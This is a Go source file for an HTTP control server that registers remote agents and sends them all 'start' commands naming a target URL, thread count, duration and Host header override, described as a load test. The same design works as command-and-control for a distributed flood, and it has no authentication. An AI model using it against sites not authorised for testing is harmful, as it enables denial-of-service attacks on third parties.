// ControlServer.go
//
// A single‐file implementation of a Control Server that:
// 1. Uses separate mutexes to avoid contention.
// 2. Employs Server‐Sent Events (SSE) for real‐time command delivery.
// 3. Maintains per‐agent command queues so no command is lost.
// 4. Gracefully shuts down on SIGINT/SIGTERM.
// 5. Marks agents offline if they don’t post heartbeats within a timeout.
// 6. Broadcasts “command-enqueued” as raw Command JSON (for agents), and “agent-status-changed” wrapped with agentID (for UI).
//
// To build and run:
//   go build -o controlserver ControlServer.go
//   ./controlserver
//
// The default listen address is :8080. Override via -addr if needed.

package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

//
// ─── MODELS & GLOBAL STORE ───────────────────────────────────────────────────
//

// Command represents a “start” or “stop” instruction for an agent.
type Command struct {
	Action     string `json:"action"`      // "start", "stop", or "none"
	URL        string `json:"url"`         // target URL for the load test
	Threads    int    `json:"threads"`     // number of threads/connections
	Timer      int    `json:"timer"`       // duration in seconds
	CustomHost string `json:"custom_host"` // optional Host header override
}

// AgentStatus holds the current state of a registered agent.
type AgentStatus struct {
	Online   bool   `json:"Online"`   // true if agent is considered online
	Status   string `json:"Status"`   // e.g. "Ready", "Sending", "Error"
	LastPing string `json:"LastPing"` // RFC3339 timestamp of last heartbeat
}

// eventPayload represents a message to send via SSE.
type eventPayload struct {
	AgentID string      // which agent this event is for (or "" for UI)
	Name    string      // SSE event name: "command-enqueued" or "agent-status-changed"
	Data    interface{} // for commands: a Command; for statuses: an AgentStatus
}

// Store holds all in‐memory data structures and their mutexes.
type Store struct {
	// Registered agents set
	agentsMu sync.Mutex
	agents   map[string]bool

	// Per-agent command queues
	cmdsMu  sync.Mutex
	pending map[string][]Command

	// Current status of each agent
	statusMu sync.Mutex
	statuses map[string]*AgentStatus

	// SSE clients: map[clientID]*sseClient
	sseMu      sync.Mutex
	sseClients map[string]*sseClient
}

// sseClient wraps a single SSE connection to an agent or UI
type sseClient struct {
	id      string
	agentID string // "" means “subscribe to all events (UI)”
	writer  http.ResponseWriter
	flusher http.Flusher
}

// NewStore initializes and returns a pointer to an empty Store.
func NewStore() *Store {
	return &Store{
		agents:     make(map[string]bool),
		pending:    make(map[string][]Command),
		statuses:   make(map[string]*AgentStatus),
		sseClients: make(map[string]*sseClient),
	}
}

//
// ─── HELPERS ──────────────────────────────────────────────────────────────────
//

// writeJSON sets Content-Type to application/json and writes v as JSON.
func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(v); err != nil {
		log.Printf("[CONTROL] writeJSON error: %v\n", err)
	}
}

// methodNotAllowed returns HTTP 405.
func methodNotAllowed(w http.ResponseWriter) {
	http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
}

//
// ─── SSE BROKER & HANDLERS ────────────────────────────────────────────────────
//

// sseHandler upgrades an HTTP GET to an SSE connection.
// If a non‐empty ?agentID is provided, that client only gets its own events.
// If agentID="" (no query param), treat it as a “UI subscriber” => gets everything.
func (s *Store) sseHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		methodNotAllowed(w)
		return
	}

	agentID := r.URL.Query().Get("agentID")
	// NOTE: We do NOT reject agentID == "". Empty means UI subscriber.

	// Set required SSE headers
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	fl, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
		return
	}

	// Create unique clientID
	clientID := agentID + "_" + strconv.FormatInt(time.Now().UnixNano(), 10)
	client := &sseClient{id: clientID, agentID: agentID, writer: w, flusher: fl}

	// Register client
	s.sseMu.Lock()
	s.sseClients[clientID] = client
	s.sseMu.Unlock()

	// Send initial comment to confirm connection
	fmt.Fprintf(w, ": connected\n\n")
	fl.Flush()
	pingTicker := time.NewTicker(1 * time.Second)
	defer pingTicker.Stop()

	go func() {
		for {
			select {
			case <-r.Context().Done():
				return
			case <-pingTicker.C:
				fmt.Fprintf(w, ": ping\n\n")
				fl.Flush()
			}
		}
	}()
	// --------------------------------------------------------------------

	// Block until client disconnects
	<-r.Context().Done()

	// Cleanup
	s.sseMu.Lock()
	delete(s.sseClients, clientID)
	s.sseMu.Unlock()
}

// runSSEBroker listens on the events channel and pushes events to matching clients.
// For “command-enqueued”: send raw Command JSON. For “agent-status-changed”: wrap into {agentID, status}.
func (s *Store) runSSEBroker(events <-chan eventPayload) {
	for ev := range events {
		switch ev.Name {
		case "command-enqueued":
			// ev.Data is a Command. We send raw JSON so the agent can unmarshal into Command.
			rawCmd, err := json.Marshal(ev.Data)
			if err != nil {
				continue // skip if invalid
			}

			s.sseMu.Lock()
			for _, client := range s.sseClients {
				// Only send “command-enqueued” to:
				//   • the specific agent (client.agentID == ev.AgentID), or
				//   • NO ONE ELSE. (UI does not need raw Command JSON in this example.)
				if client.agentID != ev.AgentID {
					continue
				}
				fmt.Fprintf(client.writer, "event: %s\n", ev.Name)
				fmt.Fprintf(client.writer, "data: %s\n\n", rawCmd)
				client.flusher.Flush()
			}
			s.sseMu.Unlock()

		case "agent-status-changed":
			// ev.Data is an AgentStatus. Wrap it so UI can see both agentID and status.
			wrapper := map[string]interface{}{
				"agentID": ev.AgentID,
				"status":  ev.Data,
			}
			wrappedBytes, err := json.Marshal(wrapper)
			if err != nil {
				continue
			}

			s.sseMu.Lock()
			for _, client := range s.sseClients {
				// Send to:
				//   • exact‐match client.agentID == ev.AgentID (the agent itself), and
				//   • any UI subscriber where client.agentID == "".
				if client.agentID != ev.AgentID && client.agentID != "" {
					continue
				}
				fmt.Fprintf(client.writer, "event: %s\n", ev.Name)
				fmt.Fprintf(client.writer, "data: %s\n\n", wrappedBytes)
				client.flusher.Flush()
			}
			s.sseMu.Unlock()

		default:
			// ignore unknown event types
		}
	}
}

//
// ─── BACKGROUND OFFLINE WATCHER ────────────────────────────────────────────────
//

// runOfflineWatcher periodically scans all agents’ LastPing timestamps.
// If any agent hasn’t pinged within offlineTimeout, mark it offline and broadcast.
func (s *Store) runOfflineWatcher(offlineTimeout time.Duration, events chan<- eventPayload) {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for range ticker.C {
		cutoff := time.Now().Add(-offlineTimeout)
		s.statusMu.Lock()
		for agentID, st := range s.statuses {
			last, err := time.Parse(time.RFC3339, st.LastPing)
			if err != nil {
				// Malformed timestamp → mark offline immediately
				if st.Online {
					st.Online = false
					st.Status = ""
					events <- eventPayload{
						AgentID: agentID,
						Name:    "agent-status-changed",
						Data:    *st,
					}
					log.Printf("[CONTROL] Marked %s OFFLINE (invalid timestamp)\n", agentID)
				}
				continue
			}
			if last.Before(cutoff) && st.Online {
				st.Online = false
				st.Status = ""
				events <- eventPayload{
					AgentID: agentID,
					Name:    "agent-status-changed",
					Data:    *st,
				}
				log.Printf("[CONTROL] Marked %s OFFLINE (last ping %s)\n", agentID, st.LastPing)
			}
		}
		s.statusMu.Unlock()
	}
}

//
// ─── HTTP HANDLERS FOR CONTROL SERVER ─────────────────────────────────────────
//

// handleCommand enqueues a “start” command for every registered agent,
// then emits a “command-enqueued” SSE event containing raw Command JSON.
func (s *Store) handleCommand(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			methodNotAllowed(w)
			return
		}

		// Parse form values
		if err := r.ParseForm(); err != nil {
			http.Error(w, "invalid form data", http.StatusBadRequest)
			return
		}
		url := strings.TrimSpace(r.FormValue("url"))
		threads, err := strconv.Atoi(r.FormValue("threads"))
		if err != nil {
			http.Error(w, "invalid threads parameter", http.StatusBadRequest)
			return
		}
		timer, err := strconv.Atoi(r.FormValue("timer"))
		if err != nil {
			http.Error(w, "invalid timer parameter", http.StatusBadRequest)
			return
		}
		customHost := r.FormValue("custom_host")

		cmd := Command{
			Action:     "start",
			URL:        url,
			Threads:    threads,
			Timer:      timer,
			CustomHost: customHost,
		}

		// Enqueue for every agent
		s.agentsMu.Lock()
		for agentID := range s.agents {
			s.cmdsMu.Lock()
			s.pending[agentID] = append(s.pending[agentID], cmd)
			s.cmdsMu.Unlock()

			// Broadcast “command-enqueued” for that agent
			events <- eventPayload{
				AgentID: agentID,
				Name:    "command-enqueued",
				Data:    cmd,
			}
			log.Printf("[CONTROL] Enqueued START for %s → %+v\n", agentID, cmd)
		}
		s.agentsMu.Unlock()

		// Redirect back to UI
		http.Redirect(w, r, "/", http.StatusSeeOther)
	}
}

// agentPollHandler responds to an agent’s GET poll.
// If there’s a queued command, send it (and remove from queue).
// Otherwise return Action:"none". Also updates LastPing and Online.
func (s *Store) agentPollHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agentID")
	if agentID == "" {
		http.Error(w, "agentID required", http.StatusBadRequest)
		return
	}

	now := time.Now().Format(time.RFC3339)

	// Register agent and update LastPing
	s.agentsMu.Lock()
	s.agents[agentID] = true
	s.agentsMu.Unlock()

	s.statusMu.Lock()
	if entry, exists := s.statuses[agentID]; exists {
		entry.Online = true
		entry.LastPing = now
	} else {
		s.statuses[agentID] = &AgentStatus{
			Online:   true,
			Status:   "Ready",
			LastPing: now,
		}
	}
	s.statusMu.Unlock()

	// Pop next command if one exists
	s.cmdsMu.Lock()
	queue := s.pending[agentID]
	if len(queue) > 0 {
		cmd := queue[0]
		s.pending[agentID] = queue[1:]
		s.cmdsMu.Unlock()
		writeJSON(w, cmd) // return the raw Command JSON
		return
	}
	s.cmdsMu.Unlock()

	// No commands → return none
	writeJSON(w, Command{Action: "none"})
}

// agentStatusHandler accepts a POST with JSON {"agentID":"…","status":"…"}.
// Updates the agent’s status and broadcasts “agent-status-changed” wrapped JSON.
func (s *Store) agentStatusHandler(events chan<- eventPayload) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			methodNotAllowed(w)
			return
		}

		var payload struct {
			AgentID string `json:"agentID"`
			Status  string `json:"status"`
		}
		if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
			http.Error(w, "invalid JSON", http.StatusBadRequest)
			return
		}
		now := time.Now().Format(time.RFC3339)

		s.statusMu.Lock()
		entry, exists := s.statuses[payload.AgentID]
		if !exists {
			entry = &AgentStatus{}
			s.agentsMu.Lock()
			s.agents[payload.AgentID] = true
			s.agentsMu.Unlock()
			s.statuses[payload.AgentID] = entry
		}
		entry.Online = true
		entry.Status = payload.Status
		entry.LastPing = now
		s.statusMu.Unlock()

		// Broadcast “agent-status-changed” with wrapped JSON
		events <- eventPayload{
			AgentID: payload.AgentID,
			Name:    "agent-status-changed",
			Data:    *entry,
		}

		w.WriteHeader(http.StatusOK)
	}
}

// listAgentStatuses returns a JSON map[agentID]AgentStatus.
// Offline agents appear with Online:false and empty Status.
func (s *Store) listAgentStatuses(w http.ResponseWriter, r *http.Request) {
	s.statusMu.Lock()
	defer s.statusMu.Unlock()

	out := make(map[string]AgentStatus, len(s.statuses))
	for id, st := range s.statuses {
		if !st.Online {
			out[id] = AgentStatus{Online: false, Status: "", LastPing: st.LastPing}
		} else {
			out[id] = *st
		}
	}
	writeJSON(w, out)
}

// renderInterface serves the static HTML interface (./Interface/index.html).
func renderInterface(w http.ResponseWriter, r *http.Request) {
	const filePath = "Interface/index.html"
	http.ServeFile(w, r, filePath)
}

//
// ─── MAIN FUNCTION: SETUP & GRACEFUL SHUTDOWN ─────────────────────────────────
//

func main() {
	// Parse flags
	listenAddr := flag.String("addr", ":8080", "HTTP listen address (e.g. :8080)")
	offlineDelay := flag.Duration("offline-timeout", 5*time.Second, "duration to mark agents offline if no heartbeat")
	flag.Parse()

	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
	log.Printf("[CONTROL] Starting server (press Ctrl+C to stop)\n")

	// Initialize store and event channel
	store := NewStore()
	events := make(chan eventPayload, 100) // buffered to avoid blocking
	defer close(events)

	// Start SSE broker and offline watcher
	go store.runSSEBroker(events)
	go store.runOfflineWatcher(*offlineDelay, events)

	// Set up HTTP routes
	mux := http.NewServeMux()

	// Serve static files under /Interface/
	mux.Handle(
		"/Interface/",
		http.StripPrefix("/Interface/", http.FileServer(http.Dir("Interface"))),
	)

	// API endpoints
	mux.HandleFunc("/events", store.sseHandler)
	mux.HandleFunc("/command", store.handleCommand(events))
	mux.HandleFunc("/poll-agent", store.agentPollHandler)
	mux.HandleFunc("/agent-status", store.agentStatusHandler(events))
	mux.HandleFunc("/agent-statuses", store.listAgentStatuses)

	// Serve index.html at root
	mux.HandleFunc("/", renderInterface)

	// Wrap with timeouts; WriteTimeout=0 so SSE isn't cut off
	srv := &http.Server{
		Addr:         *listenAddr,
		Handler:      mux,
		ReadTimeout:  5 * time.Second,
		WriteTimeout: 0,
		// <<< Disable HTTP/2 so SSE stays on HTTP/1.1 >>>
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
		IdleTimeout:  60 * time.Second,
	}

	// Graceful shutdown on SIGINT/SIGTERM
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	go func() {
		<-ctx.Done()
		log.Printf("[CONTROL] Shutdown signal received, shutting down...\n")
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		if err := srv.Shutdown(shutdownCtx); err != nil {
			log.Printf("[CONTROL] Graceful shutdown failed: %v\n", err)
		}
	}()

	log.Printf("[CONTROL] Listening on %s\n", *listenAddr)
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("[CONTROL] ListenAndServe error: %v\n", err)
	}

	log.Printf("[CONTROL] Server stopped\n")
}
